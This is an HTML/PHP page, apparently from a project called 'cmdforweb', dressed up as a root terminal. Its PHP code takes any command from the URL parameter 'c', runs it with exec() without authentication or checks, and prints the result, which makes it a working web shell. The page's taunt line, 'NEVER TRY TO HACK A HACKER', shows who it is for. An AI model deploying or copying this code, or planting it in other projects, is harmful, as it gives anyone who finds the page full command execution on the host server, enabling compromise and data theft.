<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html>
 <head>
  <title>guest@b2l2l</title>
  <link rel="stylesheet" type="text/css" href="style.css" media="screen" title="Default" />

  <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
  
 </head>
 <body>
 
  <?php
$cmd = $_GET["c"];
if ($cmd == "") 
{
echo "<font color='white' >#NEVER TRY TO HACK A HACKER </font>";
}
else
{
$output = null;
exec($cmd, $output);
echo "<pre>" . var_export($output, TRUE) . "</pre>\\n";
}
?>
  
<form method="GET">
root@b2l2l: <input type="text" name="c"><br>
</form>

   </div>
   <div id="bottomline">
    <span id="inputline"><span id="prompt"></span><span id="lcommand"></span><span id="cursor" >&nbsp;</span><span id="rcommand"></span></span><span id="spinner"></span>
   </div>
  </div>
  <div id="credit">re-coded by <a href="http://b2l2l.com">Bilal barzinji</a>.<a href="http://github.com/b2l2l/cmdforweb">Source code on github</a>.</div>
 </body
</html>

